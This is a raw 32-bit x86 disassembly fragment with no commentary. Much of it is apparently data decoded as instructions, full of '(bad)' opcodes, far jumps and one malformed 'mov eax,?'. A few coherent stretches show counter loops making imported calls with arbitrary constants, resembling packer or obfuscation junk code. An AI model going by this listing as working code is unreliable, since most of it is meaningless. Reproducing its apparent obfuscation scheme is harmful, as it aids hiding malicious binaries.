  40518f:	jle    0x40518a
  405191:	fist   WORD PTR [ebx+0x1e198f39]
  405197:	loop   0x4051b5
  405199:	fnop   
  40519b:	add    BYTE PTR [ebx-0x603e7c1e],dl
  4051a1:	xchg   edi,eax
  4051a2:	ds popa 
  4051a4:	int    0x42
  4051a6:	add    BYTE PTR [edx+edi*8+0x8ef35f1],cl
  4051ad:	add    BYTE PTR [ebx+0x776b2650],al
  4051b3:	cmp    al,BYTE PTR [edi]
  4051b5:	dec    esp
  4051b6:	in     eax,dx
  4051b7:	lods   al,BYTE PTR ds:[esi]
  4051b8:	push   esp
  4051b9:	or     DWORD PTR es:[edi+ebp*1],ebx
  4051bd:	pop    eax
  4051be:	into   
  4051bf:	and    al,0x2e
  4051c1:	rol    DWORD PTR cs:[eax],0xdd
  4051c5:	mov    eax,DWORD PTR [esi]
  4051c7:	js     0x40518e
  4051c9:	or     cl,bl
  4051cb:	out    0x68,al
  4051cd:	popa   
  4051ce:	loop   0x405249
  4051d0:	cdq    
  4051d1:	and    BYTE PTR [ebx+edx*2+0x7d],dh
  4051d5:	cmp    dh,BYTE PTR [esi+ecx*1-0x33]
  4051d9:	sbb    eax,0x7e26a065
  4051de:	mov    al,ds:0x2f9c1138
  4051e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051e4:	repnz fldenv [ecx]
  4051e7:	cs jb  0x405221
  4051ea:	or     eax,0xdb4c6971
  4051ef:	jmp    0xc13d:0x2c890f76
  4051f6:	push   eax
  4051f7:	call   0x2096:0x6187f392
  4051fe:	fcomp  QWORD PTR [edi]
  405200:	mov    ch,0x13
  405202:	sub    edx,DWORD PTR [ebx+eax*8+0x698e9ebb]
  405209:	push   ebp
  40520a:	dec    esp
  40520b:	enter  0xa9ce,0x8f
  40520f:	sub    esp,ebx
  405211:	push   esi
  405212:	(bad)  
  405213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405214:	sbb    ch,BYTE PTR [ebp+0x5982ae71]
  40521a:	or     al,BYTE PTR [esi]
  40521c:	pop    ecx
  40521d:	fimul  WORD PTR [eax]
  40521f:	jne    0x40529f
  405221:	sbb    DWORD PTR [edx],ebx
  405223:	jb     0x4051b5
  405225:	outs   dx,DWORD PTR ds:[esi]
  405226:	lods   al,BYTE PTR ds:[esi]
  405227:	bound  ax,DWORD PTR [ebx]
  40522a:	out    dx,al
  40522b:	and    BYTE PTR [edi],0x97
  40522e:	repz int 0xcd
  405231:	hlt    
  405232:	ror    BYTE PTR [edi-0x3795a40f],cl
  405238:	add    bh,BYTE PTR [edi-0x13]
  40523b:	jmp    0x405285
  40523d:	jle    0x40529f
  40523f:	push   edx
  405240:	jnp    0x40526a
  405242:	les    edi,FWORD PTR [esi+0x49]
  405245:	leave  
  405246:	fwait
  405247:	test   eax,0x97f2ea57
  40524c:	cdq    
  40524d:	xor    eax,0x9e90f898
  405252:	jle    0x4051e3
  405254:	xchg   edx,eax
  405255:	es cmp al,0x8f
  405258:	jmp    FWORD PTR [ebx+0x8]
  40525b:	pusha  
  40525c:	jo     0x405236
  40525e:	test   ebx,esp
  405260:	loop   0x405248
  405262:	(bad)  
  405263:	mov    ch,0xdd
  405265:	sub    DWORD PTR [ecx-0x6b],ecx
  405268:	mov    ecx,0xcfa6ca64
  40526d:	sub    BYTE PTR [esi+0x591646a],bl
  405273:	in     eax,0x93
  405275:	jne    0x405235
  405277:	sbb    ch,dl
  405279:	cmp    BYTE PTR [ebx+ebx*2-0x1d],0x38
  40527e:	out    dx,al
  40527f:	mov    ds:0xab98de52,eax
  405284:	push   ds
  405285:	mov    ebx,0x7b49f6da
  40528a:	inc    eax
  40528b:	xchg   ebp,eax
  40528c:	cwde   
  40528d:	sahf   
  40528e:	push   ebp
  40528f:	dec    eax
  405290:	xor    BYTE PTR [ecx+0x60],dh
  405293:	sub    DWORD PTR [esi],0x5
  405296:	sbb    eax,0xaad14aba
  40529b:	jb     0x4052f7
  40529d:	gs mov edi,0x6aedd4de
  4052a3:	adc    eax,0xc2a0b52d
  4052a8:	cwde   
  4052a9:	loopne 0x4052b8
  4052ab:	in     al,0x52
  4052ad:	stc    
  4052ae:	pop    edi
  4052af:	lds    ecx,FWORD PTR ss:[esi]
  4052b2:	pop    esi
  4052b3:	retf   
  4052b4:	mov    edx,0x8ad75320
  4052b9:	dec    edx
  4052ba:	add    ebx,ebx
  4052bc:	aad    0x52
  4052be:	and    al,0x25
  4052c0:	mov    cl,0xd
  4052c2:	jmp    0x4052ee
  4052c4:	pop    esp
  4052c5:	xor    BYTE PTR ds:0x24cad6d5,0x28
  4052cc:	pop    ecx
  4052cd:	rol    esp,cl
  4052cf:	addr16 mov al,0xdf
  4052d2:	addr16 mov ds:0x2897,al
  4052d6:	neg    DWORD PTR [ebx+0x57]
  4052d9:	test   eax,0xf69229d4
  4052de:	xor    bl,ah
  4052e0:	outs   dx,DWORD PTR ds:[esi]
  4052e1:	test   al,0x13
  4052e3:	dec    edi
  4052e4:	push   cs
  4052e5:	mov    WORD PTR [esi+0x1987e98f],cs
  4052eb:	leave  
  4052ec:	mov    ah,0xfe
  4052ee:	mov    DWORD PTR [esp+edi*2+0x262799c1],edx
  4052f5:	pop    ebx
  4052f6:	mov    ds:0x7fb6ae7f,al
  4052fb:	aaa    
  4052fc:	sub    eax,0x4a3b1b4b
  405301:	cmp    al,0x58
  405303:	popf   
  405304:	rep lods eax,DWORD PTR ds:[esi]
  405306:	fcmovu st,st(1)
  405308:	mov    dl,0x2b
  40530a:	and    al,BYTE PTR [esp+eax*8+0x218d6feb]
  405311:	or     cl,BYTE PTR [ecx+edx*8+0x52]
  405315:	sub    DWORD PTR [eax+0x719b229e],0x3e07e415
  40531f:	cli    
  405320:	inc    eax
  405321:	ret    
  405322:	mov    eax,?
  405324:	mov    esp,0x72085f9d
  405329:	mov    ch,0x94
  40532b:	push   0x60
  40532d:	lods   eax,DWORD PTR es:[esi]
  40532f:	retf   0x554c
  405332:	adc    bh,ah
  405334:	lods   al,BYTE PTR ds:[esi]
  405335:	aaa    
  405336:	pop    eax
  405337:	popa   
  405338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405339:	push   eax
  40533a:	cmp    bl,BYTE PTR [eax]
  40533c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40533d:	fild   WORD PTR [esi+0x37]
  405340:	cs mov al,0xf0
  405343:	daa    
  405344:	xchg   DWORD PTR [edi],ecx
  405346:	fs push ebx
  405348:	cdq    
  405349:	pushf  
  40534a:	mov    dh,0x66
  40534c:	retf   0xee15
  40534f:	das    
  405350:	retf   0x22bb
  405353:	fidivr WORD PTR [esi+0xa]
  405356:	stos   BYTE PTR es:[edi],al
  405357:	mov    eax,0x750692c3
  40535c:	or     edx,esi
  40535e:	xor    ebx,DWORD PTR [edi+0x73]
  405361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405362:	mov    edi,0x5a892175
  405367:	push   esi
  405368:	mov    dl,0xce
  40536a:	push   ebp
  40536b:	xlat   BYTE PTR ds:[ebx]
  40536c:	std    
  40536d:	imul   esi,DWORD PTR [edi-0x46e4931b],0xfffffffc
  405374:	jae    0x4053d5
  405376:	leave  
  405377:	jmp    0x1ed2fee2
  40537c:	js     0x405362
  40537e:	outs   dx,BYTE PTR ds:[esi]
  40537f:	jle    0x4053f6
  405381:	and    bh,dh
  405383:	mov    cl,0x6f
  405385:	inc    eax
  405386:	xchg   ebp,eax
  405387:	fisttp WORD PTR [ebx-0x77]
  40538a:	idiv   ebp
  40538c:	in     al,0xcc
  40538e:	nop
  40538f:	ror    DWORD PTR [ecx],1
  405391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405392:	jle    0x405314
  405394:	mov    eax,ds:0x196e5a3b
  405399:	(bad)  
  40539a:	fs sub al,0x39
  40539d:	imul   ebp,eax,0xffffffdd
  4053a0:	ror    BYTE PTR [esi+0x53],1
  4053a3:	jle    0x4053bd
  4053a5:	outs   dx,DWORD PTR ds:[esi]
  4053a6:	rcl    bh,cl
  4053a8:	push   ebx
  4053a9:	clc    
  4053aa:	mov    eax,ds:0x4c5df406
  4053af:	or     ecx,edx
  4053b1:	bnd jb 0x405427
  4053b4:	fidivr WORD PTR [ebp+ecx*4-0x52]
  4053b8:	lock jmp 0x2789:0x413f1370
  4053c0:	jae    0x405399
  4053c2:	std    
  4053c3:	sbb    eax,0xf92b9bb9
  4053c8:	jg     0x405437
  4053ca:	fsub   QWORD PTR [edi-0x70a197d6]
  4053d0:	xor    eax,DWORD PTR [edi-0x235fb6cf]
  4053d6:	es iret 
  4053d8:	out    0x84,al
  4053da:	or     al,0xcb
  4053dc:	ss ja  0x405407
  4053df:	push   ss
  4053e0:	scas   al,BYTE PTR es:[edi]
  4053e1:	jg     0x40544b
  4053e3:	and    eax,DWORD PTR [edx+ecx*1-0x5bcdde5b]
  4053ea:	ss addr16 inc edx
  4053ed:	pop    ds
  4053ee:	test   BYTE PTR [ecx],dl
  4053f0:	xlat   BYTE PTR ds:[ebx]
  4053f1:	mov    esp,0x5a8fd23
  4053f6:	pushf  
  4053f7:	test   eax,0xde7fbc16
  4053fc:	out    dx,al
  4053fd:	scas   eax,DWORD PTR es:[edi]
  4053fe:	js     0x40546e
  405400:	mov    esi,0x269932e
  405405:	ds lahf 
  405407:	(bad)  
  405408:	xor    esi,esp
  40540a:	push   ds
  40540b:	call   0xf475:0x111117d2
  405412:	sub    eax,0x8926a87a
  405417:	mov    cl,0x75
  405419:	dec    edi
  40541a:	(bad)  
  40541b:	in     al,dx
  40541c:	mov    edx,DWORD PTR [esi]
  40541e:	push   cs
  40541f:	and    esi,esp
  405421:	arpl   WORD PTR [edx],bp
  405423:	mov    al,ds:0xc59bd423
  405428:	lahf   
  405429:	push   0xfce23683
  40542e:	ins    DWORD PTR es:[edi],dx
  40542f:	push   cs
  405430:	pop    ebx
  405431:	fadd   DWORD PTR [ebx]
  405433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405434:	call   0x6d5ebcc6
  405439:	adc    al,0xa
  40543b:	sbb    eax,eax
  40543d:	shl    DWORD PTR [edx],0xe9
  405440:	call   0xc5ac:0x20c7f687
  405447:	cmp    al,0x5b
  405449:	int3   
  40544a:	iret   
  40544b:	test   BYTE PTR [eax+0x64638567],dh
  405451:	mov    ebp,0x4fa7bad0
  405456:	(bad)  
  405457:	imul   esp,DWORD PTR [esp],0x69
  40545b:	in     al,dx
  40545c:	fs stc 
  40545e:	mov    eax,0xa799fa61
  405463:	lea    eax,[edx-0x3de39300]
  405469:	sub    ch,BYTE PTR [edx+0x5e]
  40546c:	pop    ecx
  40546d:	lods   al,BYTE PTR ds:[esi]
  40546e:	or     bh,BYTE PTR [ebx+0x3dbb450f]
  405474:	arpl   WORD PTR [eax-0x1998b33f],si
  40547a:	mov    al,ds:0x53645138
  40547f:	in     al,dx
  405480:	jl     0x4054a3
  405482:	mov    ebp,0xb1f60a6a
  405487:	ret    
  405488:	sahf   
  405489:	lock lock add BYTE PTR [edx],0xdd
  40548e:	test   eax,0xa4329722
  405493:	mov    dl,0x4d
  405495:	js     0x40541c
  405497:	lock adc bl,BYTE PTR [edi+ebp*8+0x608a9f27]
  40549f:	dec    di
  4054a1:	sbb    DWORD PTR [eax],ebp
  4054a3:	mov    eax,0xacbea4ab
  4054a8:	scas   al,BYTE PTR es:[edi]
  4054a9:	add    BYTE PTR [edx+0x68fff8b5],dh
  4054af:	or     DWORD PTR [ebx+ebx*1-0x1c9aceef],ecx
  4054b6:	add    edi,eax
  4054b8:	mov    DWORD PTR [esi+0x34096239],esi
  4054be:	ds nop
  4054c0:	push   0xffffffc3
  4054c2:	pop    ebp
  4054c3:	sub    eax,0x102ce5a2
  4054c8:	jge    0x40546e
  4054ca:	xor    bh,BYTE PTR [esi]
  4054cc:	mov    eax,DWORD PTR [ebx]
  4054ce:	shr    ecx,1
  4054d0:	push   ss
  4054d1:	sldt   WORD PTR [eax]
  4054d4:	mov    edx,DWORD PTR [ebp-0x2c]
  4054d7:	mov    edi,DWORD PTR [ebp-0x4]
  4054da:	xor    edx,eax
  4054dc:	movzx  ebx,BYTE PTR ds:0x4337e7
  4054e3:	or     DWORD PTR ds:0x433803,ebx
  4054e9:	xor    edi,eax
  4054eb:	and    DWORD PTR ds:0x4337f3,0x0
  4054f5:	xor    ebx,ebx
  4054f7:	add    ebx,DWORD PTR ds:0x4337f3
  4054fd:	inc    ebx
  4054fe:	mov    DWORD PTR ds:0x4337f3,ebx
  405504:	cmp    DWORD PTR ds:0x4337f3,0x6
  40550b:	jne    0x40552b
  405511:	push   0x1804
  405516:	push   0x80d8
  40551b:	push   0x74bc
  405520:	push   0x5a14
  405525:	call   DWORD PTR ds:0x412370
  40552b:	cmp    DWORD PTR ds:0x4337f3,0x5
  405532:	jne    0x405545
  405538:	mov    ebx,DWORD PTR ds:0x4337f3
  40553e:	inc    ebx
  40553f:	mov    DWORD PTR ds:0x4337f3,ebx
  405545:	cmp    DWORD PTR ds:0x4337f3,0x1e
  40554c:	jb     0x4054f5
  405552:	mov    DWORD PTR ds:0x4337f7,0x387c
  40555c:	add    edi,ecx
  40555e:	add    edx,ecx
  405560:	imul   edx,edi
  405563:	mov    edi,DWORD PTR [ebp-0x8]
  405566:	and    DWORD PTR ds:0x4337b7,0x0
  405570:	mov    ebx,DWORD PTR ds:0x4337b7
  405576:	inc    ebx
  405577:	mov    DWORD PTR ds:0x4337b7,ebx
  40557d:	cmp    DWORD PTR ds:0x4337b7,0x2c
  405584:	jne    0x4055b0
  40558a:	push   DWORD PTR [ebp-0x28]
  40558d:	push   0x7933
  405592:	push   0x433946
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x24]
  40559d:	push   DWORD PTR [ebp-0x1c]
  4055a0:	push   0x42e0
  4055a5:	push   0x392f
  4055aa:	call   DWORD PTR ds:0x412374
  4055b0:	cmp    DWORD PTR ds:0x4337b7,0x1e
  4055b7:	jb     0x405570
  4055bd:	mov    ebx,DWORD PTR [ebp-0x10]
  4055c0:	sub    ebx,edi
  4055c2:	cmp    ebx,edx
  4055c4:	ja     0x4055d2
  4055ca:	mov    edx,DWORD PTR [ebp-0x28]
  4055cd:	jmp    0x4063dc
  4055d2:	mov    edx,DWORD PTR [ebp-0x30]
  4055d5:	mov    edi,DWORD PTR [ebp-0x4]
  4055d8:	xor    edx,eax
  4055da:	xor    edi,eax
  4055dc:	add    edi,ecx
  4055de:	add    edx,ecx
  4055e0:	imul   edx,edi
  4055e3:	mov    edi,DWORD PTR [ebp-0x8]
  4055e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4055e9:	sub    ebx,edi
  4055eb:	cmp    ebx,edx
  4055ed:	ja     0x4055fb
  4055f3:	mov    edx,DWORD PTR [ebp-0x2c]
  4055f6:	jmp    0x4063dc
  4055fb:	mov    edx,DWORD PTR [ebp-0x34]
  4055fe:	mov    edi,DWORD PTR [ebp-0x4]
  405601:	xor    edx,eax
  405603:	xor    edi,eax
  405605:	add    edi,ecx
  405607:	add    edx,ecx
  405609:	imul   edx,edi
  40560c:	mov    edi,DWORD PTR [ebp-0x8]
  40560f:	mov    ebx,DWORD PTR [ebp-0x10]
  405612:	sub    ebx,edi
  405614:	cmp    ebx,edx
  405616:	ja     0x40597e
  40561c:	jmp    0x405976
  405621:	(bad)  [eax+0x65]
  405624:	pop    eax
  405625:	jne    0x405698
  405627:	loope  0x405672
  405629:	clc    
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	dec    ebp
  40562c:	push   0x2acb3ee2
  405631:	test   eax,0x337e7e37
  405636:	jge    0x4056b6
  405638:	jle    0x405646
  40563a:	das    
  40563b:	xchg   DWORD PTR [edx-0x26],esp
  40563e:	gs jge 0x40569b
  405641:	jnp    0x4056c1
  405643:	jp     0x40563e
  405645:	push   cs
  405646:	in     eax,dx
  405647:	cmc    
  405648:	mov    al,ds:0xf98b103a
  40564d:	xor    eax,DWORD PTR [esi]
  40564f:	cmc    
  405650:	jno    0x405616
  405652:	ret    0xc4c7
  405655:	mov    bl,0x8c
  405657:	dec    ebp
  405658:	push   edx
  405659:	outs   dx,DWORD PTR ds:[esi]
  40565a:	lods   al,BYTE PTR ds:[esi]
  40565b:	cs dec esp
  40565d:	jp     0x405650
  40565f:	xchg   edi,eax
  405660:	fiadd  DWORD PTR [esi-0x1a]
  405663:	sub    eax,0x51b8e728
  405668:	sbb    al,BYTE PTR [ebx+eax*2-0x44db0f2]
  40566f:	mov    dl,0xb6
  405671:	dec    esp
  405672:	enter  0x3cb5,0x14
  405676:	fwait
  405677:	mov    bh,0xbe
  405679:	sub    ebx,DWORD PTR [ebx]
  40567b:	fisubr WORD PTR [edx]
  40567d:	mov    dl,0x4e
  40567f:	jne    0x40566f
  405681:	xchg   ebx,eax
  405682:	sub    DWORD PTR [ebx-0x1c4c8472],0xa
  405689:	in     eax,0x8
  40568b:	dec    esp
  40568c:	test   BYTE PTR [ebx-0x6a],cl
  40568f:	inc    esp
  405690:	sub    dl,0xb
  405693:	push   edi
  405694:	pop    ecx
  405695:	out    dx,eax
  405696:	shr    WORD PTR [ecx-0x6],0x4a
  40569b:	sar    BYTE PTR [ecx-0x4a40d305],1
  4056a1:	cmp    esi,DWORD PTR [ebx]
  4056a3:	in     eax,dx
  4056a4:	popf   
  4056a5:	xchg   DWORD PTR [ebx],edx
  4056a7:	(bad)  
  4056a8:	jp     0x405687
  4056aa:	rcl    ebp,1
  4056ac:	jne    0x4056cb
  4056ae:	inc    edx
  4056af:	mov    cl,0xa7
  4056b1:	stos   DWORD PTR es:[edi],eax
  4056b2:	jmp    0x405644
  4056b4:	inc    edi
  4056b5:	jns    0x40564d
  4056b7:	mov    eax,0xb7d9b336
  4056bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056bd:	sub    eax,0xc632a1e4
  4056c2:	add    BYTE PTR [ebp-0x389e6240],bh
  4056c8:	sti    
  4056c9:	int    0xda
  4056cb:	mov    ah,0x26
  4056cd:	nop    DWORD PTR [ecx-0x5a]
  4056d1:	inc    edx
  4056d2:	repnz popa 
  4056d4:	hlt    
  4056d5:	sahf   
  4056d6:	fstp   QWORD PTR [edx-0x65]
  4056d9:	xor    al,0xe7
  4056db:	push   eax
  4056dd:	inc    esp
  4056de:	and    DWORD PTR [ecx+0x7b71f098],ebp
  4056e4:	arpl   sp,si
  4056e6:	ret    0xf4bb
  4056e9:	add    DWORD PTR [ebp+0x6a],0x47
  4056ed:	xchg   BYTE PTR [edi+0x329f5574],dl
  4056f3:	arpl   WORD PTR [edx-0x66],ax
  4056f6:	pop    ebp
  4056f7:	or     esi,DWORD PTR [ebx+ecx*4+0x2f]
  4056fb:	jmp    0xefebf728
  405700:	cmp    DWORD PTR [ecx+0x38],esp
  405703:	ds pop ecx
  405705:	sub    DWORD PTR [edi+eiz*2+0x2e78cab0],esp
  40570c:	ss cwde 
  40570e:	jbe    0x4056f8
  405710:	xchg   edi,eax
  405711:	arpl   WORD PTR [edi-0x3f],bp
  405714:	sub    BYTE PTR [edx-0x14f65d55],bl
  40571a:	fwait
  40571b:	out    dx,eax
  40571c:	add    esi,DWORD PTR [ebx-0x21d0fce8]
  405722:	adc    eax,0x842ef1d0
  405727:	xchg   ecx,eax
  405728:	cmp    ch,BYTE PTR [edx+edi*4-0x5eeee25]
  40572f:	pop    es
  405730:	in     eax,0x90
  405732:	adc    esi,esp
  405734:	outs   dx,DWORD PTR ds:[esi]
  405735:	mov    bh,0xc0
  405737:	outs   dx,DWORD PTR ds:[esi]
  405738:	mov    ch,0x22
  40573a:	pop    edi
  40573b:	add    BYTE PTR ds:[ebx+0x46fdbd7c],ch
  405742:	xchg   DWORD PTR [ebx],ebp
  405744:	jl     0x4056d1
  405746:	scas   eax,DWORD PTR es:[edi]
  405747:	dec    edi
  405748:	push   DWORD PTR [esi]
  40574a:	ret    0x5cf7
  40574d:	mov    DWORD PTR [edi+0x3b719b58],ebp
  405753:	xlat   BYTE PTR ds:[ebx]
  405754:	push   esp
  405755:	mov    eax,ds:0x2592904f
  40575a:	inc    edx
  40575b:	mov    ebx,0xba8dba6
  405760:	ds sub al,0xc6
  405763:	loopne 0x4056f7
  405765:	aad    0xc8
  405767:	(bad)  
  405768:	or     edi,DWORD PTR [esi]
  40576a:	fild   QWORD PTR [eax]
  40576c:	and    eax,0xc735e969
  405771:	js     0x4057ec
  405773:	scas   al,BYTE PTR es:[edi]
  405774:	es es scas eax,DWORD PTR es:[edi]
  405777:	sar    edx,1
  405779:	out    0xf0,al
  40577b:	std    
  40577c:	adc    bl,ah
  40577e:	mov    edx,0xd8602053
  405783:	jmp    0x822:0x5dad5b21
  40578a:	data16 rcl BYTE PTR [ecx-0x4b],cl
  40578e:	mov    bh,0x3a
  405790:	lods   al,BYTE PTR ds:[esi]
  405791:	xchg   ecx,eax
  405792:	popf   
  405793:	cdq    
  405794:	mov    ecx,DWORD PTR [ebx+0x5af0dd0]
  40579a:	lea    esi,[ebp-0x5e]
  40579d:	pop    es
  40579e:	mov    eax,ds:0xec099984
  4057a3:	mov    ah,0x3
  4057a5:	jmp    0x405731
  4057a7:	xchg   edi,eax
  4057a8:	mov    edx,0x1156d901
  4057ad:	jecxz  0x40574b
  4057af:	sub    DWORD PTR [edi],esi
  4057b1:	inc    ecx
  4057b2:	cmc    
  4057b3:	and    DWORD PTR [edi+0x7c],ebp
  4057b6:	ins    BYTE PTR es:[edi],dx
  4057b7:	call   0xee611ec
  4057bc:	jge    0x4057dc
  4057be:	xor    al,0x26
  4057c0:	pop    es
  4057c1:	mov    edx,0x751fc571
  4057c6:	add    dh,BYTE PTR [esi]
  4057c8:	xor    DWORD PTR [edi-0x388c1f18],ebx
  4057ce:	xchg   ebp,eax
  4057cf:	int    0x2c
  4057d1:	sub    eax,0xc90d52e
  4057d6:	sbb    dh,ch
  4057d8:	imul   edx,DWORD PTR [ecx],0x2dfed0ea
  4057de:	xor    ebp,DWORD PTR [ebx-0x33]
  4057e1:	push   ds
  4057e2:	adc    al,0xae
  4057e4:	gs mov esp,0x247f3a4a
  4057ea:	sub    al,0xc2
  4057ec:	outs   dx,DWORD PTR ds:[esi]
  4057ed:	mov    al,ds:0xe70c6191
  4057f2:	add    ebp,ebp
  4057f4:	cmp    BYTE PTR [eax],bl
  4057f6:	mov    dh,0x48
  4057f8:	mov    bl,0x6d
  4057fa:	cli    
  4057fb:	sub    BYTE PTR [esi+0x1],al
  4057fe:	daa    
  4057ff:	xor    BYTE PTR [eax-0x21],dh
  405802:	sub    BYTE PTR ds:0x23f68f76,bh
  405808:	in     eax,0x24
  40580a:	dec    edi
  40580b:	adc    esp,DWORD PTR [ecx]
  40580d:	loope  0x405827
  40580f:	clc    
  405810:	xchg   ebp,eax
  405811:	adc    eax,0xa32e3d99
  405816:	scas   eax,DWORD PTR es:[edi]
  405817:	jno    0x405837
  405819:	(bad)  
  40581a:	daa    
  40581b:	les    edi,FWORD PTR [ebx-0x48]
  40581e:	outs   dx,BYTE PTR ds:[esi]
  40581f:	pusha  
  405820:	ins    DWORD PTR es:[edi],dx
  405821:	adc    al,0xa0
  405823:	int3   
  405824:	aaa    
  405825:	retf   0xd424
  405828:	lds    ebp,FWORD PTR [ebp+0x3a]
  40582b:	pusha  
  40582c:	pop    eax
  40582d:	test   BYTE PTR [eax],0x38
  405830:	mov    bh,0x7
  405832:	lock add ebx,DWORD PTR [edi+0x6cd28e57]
  405839:	add    eax,0x47155299
  40583e:	dec    ebp
  40583f:	ret    
  405840:	scas   al,BYTE PTR es:[edi]
  405841:	mov    esp,0xb77dd4b7
  405846:	(bad)  
  405847:	and    DWORD PTR [edx-0x2],edi
  40584a:	out    0xd4,al
  40584c:	pop    esp
  40584d:	jae    0x4058a8
  40584f:	xchg   edx,eax
  405850:	jmp    0xf2f1:0x71206f0c
  405857:	(bad)  [esi-0xe]
  40585a:	mov    ebx,0xa4d2a06e
  40585f:	std    
  405860:	les    ebp,FWORD PTR [ecx]
  405862:	ret    0x125f
  405865:	push   ebx
  405866:	test   DWORD PTR [ebx+edi*1],eax
  405869:	ja     0x40584b
  40586b:	jl     0x4057f8
  40586d:	and    edi,DWORD PTR [ecx]
  40586f:	daa    
  405870:	push   0xffffffcb
  405872:	adc    DWORD PTR [esi],ebx
  405874:	les    edx,FWORD PTR [edi-0x22433eee]
  40587a:	out    0x86,eax
  40587c:	cld    
  40587d:	pop    eax
  40587e:	push   eax
  40587f:	add    esi,ecx
  405881:	pop    edi
  405882:	xor    esi,esi
  405884:	adc    eax,0x39934ee0
  405889:	ins    DWORD PTR es:[edi],dx
  40588a:	cmp    eax,0x950d39fd
  40588f:	push   edi
  405890:	loopne 0x405827
  405892:	fs js  0x4058f5
  405895:	mov    ah,0x9d
  405897:	push   es
  405898:	jecxz  0x405848
  40589a:	xlat   BYTE PTR ds:[ebx]
  40589b:	outs   dx,BYTE PTR ds:[esi]
  40589c:	or     ecx,DWORD PTR [esi+edi*1]
  40589f:	scas   al,BYTE PTR es:[edi]
  4058a0:	out    0x41,al
  4058a2:	pop    ss
  4058a3:	lods   eax,DWORD PTR ds:[esi]
  4058a4:	into   
  4058a5:	jno    0x405848
  4058a7:	dec    edx
  4058a8:	ins    BYTE PTR es:[edi],dx
  4058a9:	mov    esp,gs
  4058ab:	sti    
  4058ac:	dec    edi
  4058ad:	cdq    
  4058ae:	pop    ebp
  4058af:	cmp    BYTE PTR [edi+0x5b0718dc],0x11
  4058b6:	aad    0x85
  4058b8:	inc    ebx
  4058b9:	clc    
  4058ba:	push   ds
  4058bb:	inc    edi
  4058bc:	shr    BYTE PTR [edi-0x55ad43ee],0x8a
  4058c3:	daa    
  4058c4:	fld    TBYTE PTR [eax-0x4a]
  4058c7:	pop    edi
  4058c8:	fdiv   QWORD PTR [esi+eiz*2+0x63eb41eb]
  4058cf:	loope  0x405912
  4058d1:	rcr    esp,cl
  4058d3:	or     eax,0x4a20d8c8
  4058d8:	shl    BYTE PTR [ebx-0x51],1
  4058db:	out    0xd,eax
  4058dd:	je     0x405914
  4058df:	(bad)  [esi]
  4058e1:	aam    0x3e
  4058e3:	repz aam 0x5a
  4058e6:	mov    ah,0x0
  4058e8:	clc    
  4058e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058ea:	add    cl,0xef
  4058ed:	aas    
  4058ee:	add    BYTE PTR [eax],bh
  4058f0:	hlt    
  4058f1:	arpl   WORD PTR [esi+0x357b754f],si
  4058f7:	mov    cl,BYTE PTR [ebp-0x10]
  4058fa:	mov    esp,0x6788faa3
  4058ff:	pop    esi
  405900:	clc    
  405901:	jns    0x4058b6
  405903:	or     ecx,edi
  405905:	arpl   bp,sp
  405907:	jne    0x405946
  405909:	dec    esp
  40590a:	shl    BYTE PTR [ecx+0x29d30c2c],1
  405910:	lock scas eax,DWORD PTR es:[edi]
  405912:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405913:	xor    esi,DWORD PTR [edx+0x11]
  405916:	int3   
  405917:	xchg   ebx,eax
  405918:	ja     0x40595c
  40591a:	gs (bad) 
  40591c:	test   BYTE PTR [edx-0xd],0x9c
  405920:	adc    cl,BYTE PTR [ebx+0x25]
  405923:	pop    esi
  405924:	dec    eax
  405925:	mov    al,0xb1
  405927:	ret    
  405928:	mov    eax,0x26519bf8
  40592d:	jmp    0x1e43:0x4aae8cfa
  405934:	cwde   
  405935:	loopne 0x405934
  405937:	pop    eax
  405938:	out    0x36,al
  40593a:	jge    0x4058d9
  40593c:	aaa    
  40593d:	stos   DWORD PTR es:[di],eax
  40593f:	stos   DWORD PTR es:[edi],eax
  405940:	pop    es
  405941:	push   esp
  405942:	xchg   ebp,eax
  405943:	push   cs
  405944:	dec    ebp
  405945:	fdivr  DWORD PTR [eax-0x3ead4949]
  40594b:	(bad)  
  40594c:	aas    
  40594d:	cli    
  40594e:	fild   DWORD PTR [edi]
  405950:	test   DWORD PTR [ecx-0x6762c913],edx
  405956:	jp     0x4059a4
  405958:	fild   WORD PTR [esi]
  40595a:	dec    esp
  40595b:	lock and al,0xb9
  40595e:	mov    dl,0xdf
  405960:	fdivr  DWORD PTR [edx-0x124f836e]
  405966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405967:	add    eax,0xde6b4d65
  40596c:	leave  
  40596d:	inc    ebx
  40596e:	dec    ebp
  40596f:	shr    BYTE PTR [edx+0x40fc5130],0xc5
  405976:	mov    edx,DWORD PTR [ebp-0x30]
  405979:	jmp    0x4063dc
  40597e:	mov    edx,DWORD PTR [ebp-0x38]
  405981:	mov    edi,DWORD PTR [ebp-0x4]
  405984:	xor    edx,eax
  405986:	xor    edi,eax
  405988:	add    edi,ecx
  40598a:	add    edx,ecx
  40598c:	imul   edx,edi
  40598f:	mov    edi,DWORD PTR [ebp-0x8]
  405992:	mov    ebx,DWORD PTR [ebp-0x10]
  405995:	sub    ebx,edi
  405997:	cmp    ebx,edx
  405999:	ja     0x405d01
  40599f:	jmp    0x405cf9
  4059a4:	push   0x20
  4059a6:	outs   dx,BYTE PTR ds:[esi]
  4059a7:	adc    dh,BYTE PTR [eax+edx*2+0x72]
  4059ab:	pusha  
  4059ac:	cli    
  4059ad:	sar    BYTE PTR [eax+0x5f],1
  4059b0:	retf   0xe57f
  4059b3:	fs push 0x32
  4059b6:	jle    0x405a36
  4059b8:	xor    edi,DWORD PTR [ebp+0x7e]
  4059bb:	jle    0x4059e8
  4059bd:	push   ds
  4059be:	fwait
  4059bf:	xor    eax,0x32b780f4
  4059c4:	sbb    eax,0x2156a9ee
  4059c9:	out    dx,al
